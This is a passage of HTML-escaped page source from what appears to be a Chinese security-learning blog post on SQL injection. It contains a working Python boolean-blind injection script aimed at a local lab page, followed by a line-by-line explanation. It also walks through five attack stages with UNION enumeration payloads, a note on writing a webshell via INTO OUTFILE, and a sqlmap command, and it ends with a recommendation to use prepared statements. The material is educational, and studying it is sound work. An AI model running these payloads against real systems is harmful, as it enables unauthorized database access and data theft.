+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="s2"&gt;&amp;#34;http://127.0.0.1/sqli/3.php?id=0 or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s2"&gt;,1))=&lt;/span&gt;&lt;span class="si"&gt;%d&lt;/span&gt;&lt;span class="s2"&gt;--+&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="s2"&gt;&amp;#34;http://127.0.0.1/sqli/3.php?id=0 or ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&amp;#39;answer&amp;#39;),&lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s2"&gt;,1))=&lt;/span&gt;&lt;span class="si"&gt;%d&lt;/span&gt;&lt;span class="s2"&gt;--+&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="s2"&gt;&amp;#34;http://127.0.0.1/sqli/3.php?id=0 or ascii(substr((select group_concat(flag) from answer),&lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s2"&gt;,1))=&lt;/span&gt;&lt;span class="si"&gt;%d&lt;/span&gt;&lt;span class="s2"&gt;--+&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;get_data&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;url_template&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;result&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="c1"&gt;# 外层循环：遍历字符位置&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;100&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;found&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="kc"&gt;False&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="c1"&gt;# 内层循环：遍历 ASCII 字符 (33-126 为可打印字符)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;j&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;33&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;127&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;payload&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;url_template&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;try&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="c1"&gt;# 发送请求&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;s&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;requests&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;payload&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;timeout&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="c1"&gt;# 判断逻辑：页面中包含&amp;#34;查询&amp;#34;字样表示匹配成功&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;查询&amp;#34;&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;text&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;result&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="nb"&gt;chr&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="sa"&gt;f&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;[*] 当前结果: &lt;/span&gt;&lt;span class="si"&gt;{&lt;/span&gt;&lt;span class="n"&gt;result&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;found&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="kc"&gt;True&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;break&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;except&lt;/span&gt; &lt;span class="ne"&gt;Exception&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="n"&gt;e&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="sa"&gt;f&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;[!] 请求错误: &lt;/span&gt;&lt;span class="si"&gt;{&lt;/span&gt;&lt;span class="n"&gt;e&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;time&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sleep&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;# 遇到错误稍作休息&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="c1"&gt;# 如果这一位遍历完所有字符都没找到（即字符已结束），则跳出&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="ow"&gt;not&lt;/span&gt; &lt;span class="n"&gt;found&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;break&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;result&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="vm"&gt;__name__&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;__main__&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;template&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;payload_templates&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="sa"&gt;f&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s2"&gt;[+] 开始获取新目标数据...&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;final_data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;get_data&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;template&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="sa"&gt;f&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;[!] 获取完成: &lt;/span&gt;&lt;span class="si"&gt;{&lt;/span&gt;&lt;span class="n"&gt;final_data&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;-&amp;#34;&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="mi"&gt;30&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h5 id="1-核心逻辑架构盲注的本质"&gt;1. 核心逻辑架构：盲注的本质
+&lt;/h5&gt;&lt;p&gt;盲注（Blind SQLi）与联合注入（UNION-based）最大的区别在于：&lt;strong&gt;盲注不需要页面回显 SQL 查询结果&lt;/strong&gt;。它就像是玩“猜数字”游戏，脚本通过不断提问（发送 Payload），数据库只回答“是”或“否”。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;提问方式&lt;/strong&gt;：脚本构造一个 &lt;code&gt;WHERE&lt;/code&gt; 条件，如果结果为真，页面内容包含“查询”；如果为假，页面不包含“查询”。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;读取方式&lt;/strong&gt;：利用 &lt;code&gt;SUBSTR()&lt;/code&gt; 一次只获取一个字符，通过 &lt;code&gt;ASCII()&lt;/code&gt; 将字符转为数字进行范围比对（二分法或枚举）。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h5 id="2-详细代码拆解"&gt;2. 详细代码拆解
+&lt;/h5&gt;&lt;h6 id="a-构造-payload-sql-层面"&gt;A. 构造 Payload (SQL 层面)
+&lt;/h6&gt;&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-SQL" data-lang="SQL"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;id&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;or&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;ascii&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;substr&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="k"&gt;select&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;database&lt;/span&gt;&lt;span class="p"&gt;()),&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;span class="o"&gt;=%&lt;/span&gt;&lt;span class="n"&gt;d&lt;/span&gt;&lt;span class="c1"&gt;--+
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;id=0&lt;/code&gt;：通常是一个不存在的 ID，目的是让原本的查询结果为空，从而使 &lt;code&gt;OR&lt;/code&gt; 后面的注入条件生效。&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;substr(..., %s, 1)&lt;/code&gt;：这是切片函数。&lt;code&gt;%s&lt;/code&gt; 是当前字符的索引（第 1 位、第 2 位&amp;hellip;），&lt;code&gt;1&lt;/code&gt; 表示截取长度为 1。&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;ascii(...) = %d&lt;/code&gt;：将获取到的字符转换为 ASCII 码（如 &amp;lsquo;a&amp;rsquo; 转换为 97），然后与 &lt;code&gt;%d&lt;/code&gt; 进行比对。&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;--+&lt;/code&gt;：注释掉 SQL 语句后面的部分（如原始查询中的 &lt;code&gt;ORDER BY&lt;/code&gt; 或其他逻辑），保证注入语句的完整性。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h6 id="b-自动化获取流程-python-层面"&gt;B. 自动化获取流程 (Python 层面)
+&lt;/h6&gt;&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;span class="lnt"&gt;2
+&lt;/span&gt;&lt;span class="lnt"&gt;3
+&lt;/span&gt;&lt;span class="lnt"&gt;4
+&lt;/span&gt;&lt;span class="lnt"&gt;5
+&lt;/span&gt;&lt;span class="lnt"&gt;6
+&lt;/span&gt;&lt;span class="lnt"&gt;7
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-Python" data-lang="Python"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;100&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt; &lt;span class="c1"&gt;# 外层：定位字符位置&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;j&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;33&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;127&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt; &lt;span class="c1"&gt;# 内层：暴力枚举 ASCII 码&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;payload&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;url&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;# 构造 URL&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;s&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;requests&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;payload&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;# 发送请求&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;查询&amp;#34;&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;text&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="c1"&gt;# 核心：判断“盲注”结果&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;result&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="nb"&gt;chr&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;# 若为真，记录字符&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;break&lt;/span&gt; &lt;span class="c1"&gt;# 找到字符，进入下一个位置&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h5 id="3-为什么脚本会这样设计"&gt;3. 为什么脚本会这样设计？
+&lt;/h5&gt;&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;为什么是 &lt;code&gt;range(33, 127)&lt;/code&gt;？&lt;/strong&gt; ASCII 码中，33 到 126 是键盘上可打印的字符（数字、字母、常用符号）。0-32 是控制字符（如换行、回车），对于数据库名称或表名，这些字符几乎不会出现。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;为什么用 &lt;code&gt;group_concat()&lt;/code&gt;？&lt;/strong&gt; 盲注通常无法一次性获取多行结果。&lt;code&gt;group_concat()&lt;/code&gt; 将所有表名或列名合并成一个很长的字符串，从而让脚本可以用循环遍历整个字符串。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;如何判断“真”与“假”？&lt;/strong&gt; 脚本利用了 &lt;code&gt;if &amp;quot;查询&amp;quot; in s.text&lt;/code&gt;。
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;真 (True)&lt;/strong&gt;：页面返回正常数据或特定标记，包含“查询”关键词。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;假 (False)&lt;/strong&gt;：页面可能显示“未找到结果”或只是空白，不包含“查询”关键词。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h4 id="5-为什么会有这种漏洞"&gt;5. 为什么会有这种漏洞？
+&lt;/h4&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;页面逻辑耦合：&lt;/strong&gt; 开发者在后端代码中，将数据库的查询结果直接作为页面逻辑的分支条件。例如：&lt;code&gt;if ($result) { echo &amp;quot;欢迎&amp;quot;; } else { echo &amp;quot;未找到&amp;quot;; }&lt;/code&gt;。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;缺乏防御：&lt;/strong&gt; 开发人员认为只要不把数据直接打印在屏幕上就是安全的，却忽略了&lt;strong&gt;这种“真假回显”本身就泄露了数据库内部逻辑&lt;/strong&gt;。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id="sql注入过程"&gt;SQL注入过程
+&lt;/h3&gt;&lt;p&gt;SQL 注入的过程通常遵循一个标准化的逻辑链条。对于初学者或安全研究人员来说，可以将其拆解为五个核心阶段。&lt;/p&gt;
+&lt;h4 id="sql-注入的五个攻击阶段"&gt;SQL 注入的五个攻击阶段
+&lt;/h4&gt;&lt;h5 id="1-发现注入点-detection"&gt;1. 发现注入点 (Detection)
+&lt;/h5&gt;&lt;p&gt;攻击者首先会扫描 Web 应用中的交互入口，尝试通过输入特殊字符触发异常。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;输入测试：&lt;/strong&gt; 在 URL 参数、搜索框、登录表单等位置输入 &lt;code&gt;'&lt;/code&gt;, &lt;code&gt;&amp;quot;&lt;/code&gt;, &lt;code&gt;)&lt;/code&gt;, &lt;code&gt;#&lt;/code&gt;, &lt;code&gt;--&lt;/code&gt; 等字符。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;判断依据：&lt;/strong&gt; 如果页面出现数据库错误提示、页面显示内容异常、或者响应时间与正常情况不同，则说明该参数可能存在注入点。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h5 id="2-判断注入类型-fingerprinting"&gt;2. 判断注入类型 (Fingerprinting)
+&lt;/h5&gt;&lt;p&gt;确认存在注入点后，需要判断注入的类型，以便选择对应的策略。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;u&gt;&lt;strong&gt;数字型 vs 字符型：&lt;/strong&gt; 判断后端代码是否使用了引号包裹参数。&lt;/u&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;注入方式：&lt;/strong&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;联合注入 (UNION-based)：&lt;/strong&gt; 页面有直接回显。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;报错注入 (Error-based)：&lt;/strong&gt; 页面不回显数据，但会显示数据库的报错信息。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;布尔盲注 (Boolean-based)：&lt;/strong&gt; 页面根据查询真假显示不同内容（如“欢迎登录” vs “账号错误”）。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;时间盲注 (Time-based)：&lt;/strong&gt; 通过注入 &lt;code&gt;SLEEP()&lt;/code&gt; 函数，观察页面响应延迟来判断逻辑真假。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h5 id="3-探测数据库结构-enumeration"&gt;3. 探测数据库结构 (Enumeration)
+&lt;/h5&gt;&lt;p&gt;利用数据库自带的元数据表（如 MySQL 中的 &lt;code&gt;information_schema&lt;/code&gt;）获取权限和结构。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;获取数据库名：&lt;/strong&gt; &lt;code&gt;... UNION SELECT 1, database(), 3--&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;获取表名：&lt;/strong&gt; &lt;code&gt;... UNION SELECT 1, group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()--&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;获取列名：&lt;/strong&gt; &lt;code&gt;... UNION SELECT 1, group_concat(column_name) FROM information_schema.columns WHERE table_name='users'--&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h5 id="4-获取敏感数据-exfiltration"&gt;4. 获取敏感数据 (Exfiltration)
+&lt;/h5&gt;&lt;p&gt;当已知表名（如 &lt;code&gt;users&lt;/code&gt;）和列名（如 &lt;code&gt;username&lt;/code&gt;, &lt;code&gt;password&lt;/code&gt;）后，通过拼接查询语句获取具体内容。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;攻击载荷：&lt;/strong&gt; &lt;code&gt;SELECT username, password FROM users&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;结果：&lt;/strong&gt; 页面直接显示出数据库中存放的所有账号和密码。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h5 id="5-后渗透与提权-post-exploitation"&gt;5. 后渗透与提权 (Post-Exploitation)
+&lt;/h5&gt;&lt;p&gt;根据数据库权限，攻击者可能进一步扩大影响。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;写文件：&lt;/strong&gt; 如果拥有 &lt;code&gt;FILE&lt;/code&gt; 权限且知道服务器物理路径，可使用 &lt;code&gt;INTO OUTFILE&lt;/code&gt; 写入一句话木马。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;执行系统命令：&lt;/strong&gt; 如果是 SQL Server 或高权限的 MySQL，可能尝试调用系统存储过程进行提权。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id="给安全学习者的建议"&gt;给安全学习者的建议
+&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;观察响应差异：&lt;/strong&gt; 在处理盲注（Blind SQLi）时，重点观察 &lt;strong&gt;HTTP 响应包的状态码、内容长度 (Content-Length) 或响应时间&lt;/strong&gt;，这是判断注入是否成功的核心。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;使用标准工具链：&lt;/strong&gt; 在练习（如 CTF）或合法测试中，&lt;code&gt;sqlmap&lt;/code&gt; 是最常用的自动化工具。它能自动处理上述所有阶段。
+&lt;ul&gt;
+&lt;li&gt;&lt;em&gt;命令示例：&lt;/em&gt; &lt;code&gt;sqlmap -u &amp;quot;http://target.com/page.php?id=1&amp;quot; --dbs&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;防御意识：&lt;/strong&gt; 无论攻击过程多么复杂，最终的防御逻辑永远是 &lt;strong&gt;“预编译” (Prepared Statements)&lt;/strong&gt;。只要将数据和指令彻底隔离开，SQL 注入就失去了执行的根基。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id="php反序列化漏洞"&gt;PHP反序列化漏洞
